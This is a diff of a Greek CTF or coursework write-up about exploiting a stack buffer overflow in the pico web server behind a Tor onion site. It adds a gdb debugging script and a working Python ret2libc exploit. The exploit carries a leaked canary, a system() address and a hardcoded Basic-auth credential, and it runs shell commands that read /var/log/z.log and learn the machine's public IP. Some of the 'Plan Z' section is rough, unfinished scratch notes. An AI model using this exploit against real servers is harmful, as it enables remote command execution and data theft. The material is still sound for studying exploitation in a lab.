@@ -345,11 +345,29 @@ Love you big time!
 ## Ερώρημα 3
 Για να απαντήσουμε την ερώτηση "**Ποια ειναι τα results του "Plan Y";**" ακολουθήσαμε την παρακάτω διαδικασία:
 
-Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η memcpy θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε buffer overflow.
+Έχοντας αποκτήσει πρόσβαση στο site http://4tpgiulwmoz4sphv.onion από το προηγούμενο ερώτημα, είδαμε στο κάτω μέρος της λευκής σελίδας τα παρακάτω χρήσιμα tips:
+```
+PS1. Neat trick, run this (with the tor browser open) and you can access
+foo.onion with a normal browser under http://localhost:8000
+
+socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:foo.onion:80,socksport=9150
+
+PS2. As always a big part of the YS13 mission is research. Reaching Saturn is not easy.
+Lately we've been finishing the experiments for "Plan Y" which is finding the actual value of the ultimate coefficient.
+Check the page below for some preliminary results. This is strictly for admins now so as to not
+further destabilize the space-plant continuum.
+```
+καθως και μια **φόρμα εισόδου** η οποία κάνει post request στο path http://4tpgiulwmoz4sphv.onion/ultimate.html. Ετσι αρχίσαμε να βλέπουμε λίγο τον κώδικα του [pico server](https://github.com/chatziko/pico) για να καταλάβουμε την ροή που θα ακολουθήσει για να επεξεργαστεί το request και τέλος να στείλει κάποιο αποτέλεσμα πίσω στον client. 
+
+Αρχικά ο server οταν ξεκινάει καλεί την συνάρτηση **server_forever** η οποία περιμένει συνδέσεις στην θύρα **8080** χρησιμοποιώντας την blocking συνάρτηση **accept**. Τη στιγμή που θα έρθει κάποιο αίτημα, η κατάσταση του process θα αλλάξει από **block**/**wait** σε **running** ξανά και αμέσως μετά θα γίνει **fork** έτσι ώστε να εξυπυρετήσει τον **client** στον κώδικα του child process. Στη συνέχεια το child process θα καλέσει τη συνάρτηση **respond** η οποία αναλαμβάνει να χειριστεί το request καθώς και να θέσει το standard output να πηγαίνει κατευθείαν στο **socket** εκτελώντας την εντολή:
+```c
+dup2(clientfd, STDOUT_FILENO);
+```
+Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1 ). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η **memcpy** θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε **buffer overflow**.
 
 ### Ανάλυση επίθεσης
 
-Στη συνέχεια τρέξαμε τον pico server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.
+Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.
 
 Αμέσως μετά κάναμε κλήση της συνάρτησης memset όπως φαίνεται παρακάτω ώστε να γεμίσουμε τον buffer με 'Α' για να μας είναι πιο ξεκάθαρο το περιεχόμενο του frame:
 ```bash
@@ -459,7 +477,7 @@ print("text = [" + response.text+ "]")
 except requests.exceptions.RequestException as e:
 print(e)
 ```
-Response:
+Τα results του “Plan Y” είναι:
 
  > Results:
 > 
@@ -471,7 +489,11 @@ Response:
 > The log is here: /var/log/z.log
 
 ### Debugging
-Επειδή έπρεπε να τρέξουμε συγκεκριμένες εντολές κάθε φορά που τρέχαμε τον gdb, δημιουργήσαμε το παρακάτω script όπου αυτοματοποιεί την διαδικασία του debug.
+Ο server κάνει **fork** για κάθε αίτημα από τον client όπως αναφέρθηκε παραπάνω και ο target κώδικας που μας ενδιέφερε για κάνουμε το **buffer overflow** είναι κώδικας που τον τρέχει το child process με αποτέλεσμα, κάθε φορά που θέλαμε να σταματήσουμε στην εντολή **memcpy** (main.c:179) με breakpoint να χρειάζεται πρώτα να σταματήσουμε κάπου πριν γίνει το **fork** (πχ httpd.c:58) και μετά με την gdb εντολή:
+```bash
+set follow-fork-mode child
+```
+να τον ενημερώσουμε πως αν γίνει fork να ακολουθήσει (attach) το child process. Επειδή έπρεπε συνέχεια να δίνουμε συγκεκριμένες εντολές για να το πετύχουμε αυτό, δημιουργήσαμε το παρακάτω script όπου αυτοματοποιεί λίγο την διαδικασία του debug.
 
 **debug.sh:** 
 ```bash
@@ -495,8 +517,7 @@ gdb\
 -ex 'x/a $ebp + 4'\
 ./picoserver
 ```
-Περιγραφή του παραπάνω script: 
-Αρχικά κάνει compile τον server, κάνει kill αν υπάρχει ανοικτό process,  τρέχει τον gdb και τρέχει τις εξής gdb εντολές:
+Το παραπάνω script κάνει compile τον server, κάνει kill αν υπάρχει ανοικτό process και τρέχει τον gdb με τις εξής εντολές:
 1) Εισαγωγή breakpoints
 2) run
 3) Ενημερώνει τον gdb να κάνει αυτόματα attach στο πρώτο fork
@@ -529,5 +550,131 @@ p ($ebp - $esp) / 4
 ```bash
 x/40xw $sp
 ```
+## Ερώρημα 4
+Για να απαντήσουμε την ερώτηση "**Ποιο είναι το code του "Plan Z";**" ακολουθήσαμε την παρακάτω διαδικασία:
+
+```
+socket | overwrite process with new | same ebp
+
+system argument
+
+pointer to string
+
+diorthosame to request script gia na min grafoume kathe fora 
+tis hex word addresses se morfi bytes me to xeri
+
+θελαμε να υπολογισουμε τη διευθυνση του system πρώτα και επειδή ξεκινούσε από b7 
+
+```
+
+
+```
++--------------------+
+| Saved $ebp         |
++--------------------+
+|                    |
++--------------------+
+|                    |
+|                    |
++--------------------+
+```
+
+
+
+
+
+
+
+
+
+Διορθωμένο script
+```python
+import requests
+
+headers = {
+    'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'http://127.0.0.1:8080',
+    'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
+    'Connection': 'keep-alive',
+    'Referer': 'http://127.0.0.1:8080/',
+    'Upgrade-Insecure-Requests': '1',
+}
+
+data = b'A' * 100  # <-- buffer check
+ba = bytearray.fromhex("fcd7c600") # <-- canary
+ba.reverse()
+data += ba  
+data += b'A' * 12  # <-- saved $ebp check 0xbfffef98
+ba = bytearray.fromhex("b7c55da0") # <-- saved eip
+ba.reverse()
+data += ba
+ba = bytearray.fromhex("bfffee14")  # <-- char**
+ba.reverse()
+data += ba
+ba = bytearray.fromhex("bfffee18") # <-- char*
+ba.reverse()
+data += ba
+data += b"dig +short myip.opendns.com @resolver1.opendns.com"
+
+data += b'\x00'
+print(data)
+try:
+    response = requests.post('http://127.0.0.1:8080/ultimate.html', headers=headers, data=data)
+    status_code = response.status_code
+    print("status_code = [" + str(status_code) + "]")
+    print("text = [" + response.text + "]")
+except requests.exceptions.RequestException as e:
+    print(e)
+```
+
+
+To code του Plan Z είναι: c43.85.143.73
+
+
+Για να δούμε το αρχείο z.log, ακολουθήσαμε παρόμοια πορεία με το ερώτημα
+3. 
+
+Κάναμε το buffer overflow εχοντας το canary και τα offset απο το local
+στο remote που χρειαζόμασταν, από την printf του ερωτήματος 2. 
+
+Για $eip  βάλαμε τη διεύθυνση της system() από την libc και μετά από το $eip βάλαμε
+ένα δείκτη που έδειχνε στο πρώτο στοιχείο του ορίσματος το οποίο βάλαμε
+και τελευταίο. 
+
+Με το request που κάναμε, μας ερχόταν μόνο η πρώτη γραμμή
+του αρχείου, οπότε χρησιμοποιήσαμε το command "paste -sd, /var/log/z.log"
+για να ενώσουμε όλες τις γραμμές σε μία (αλλάξαμε τα new lines με κόμμα
+",". 
+
+
+Όταν πήραμε το αρχείο υπολογίσαμε το <next move>. Για τον υπολογισμό
+του, αρχικά νομίζαμε ότι ήταν κάποιο cipher text και δοκιμάσαμε διάφορους
+αλγόριθμους που έχουν αναφερθεί στο μάθημα, χωρίς επιτυχία. 
+
+Τέλος μετά από
+ψάξιμο στο google καταλήξαμε στο συμπέρασμα ότι είναι συντεταγμένες
+κινήσεων στο σκάκι στον αγόνα Deep Blue (Computer) vs Garry Kasparov . :D
+
+Στην επόμενη κίνηση το Deep Blue νίκησε "19.c4 1-0", οπότε το next move
+ηταν το "c4". 
+
+Για την ip κάναμε ακριβώς την ίδια επίθεση όπως στην αρχή
+του βήματος, αλλά αλλάξαμε το command που δώσαμε στο system σε "dig +short
+myip.opendns.com @resolver1.opendns.com" ώστε να βρούμε την public ip η
+οποία ήταν: 3.85.143.73. 
+
+Βάλαμε το c4 στην αρχή της και καταλήξαμε πως:
+
+"<next move><public IP of this machine>":  "c43.85.143.73"
+
+
+
+
+
+
+
 
 Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
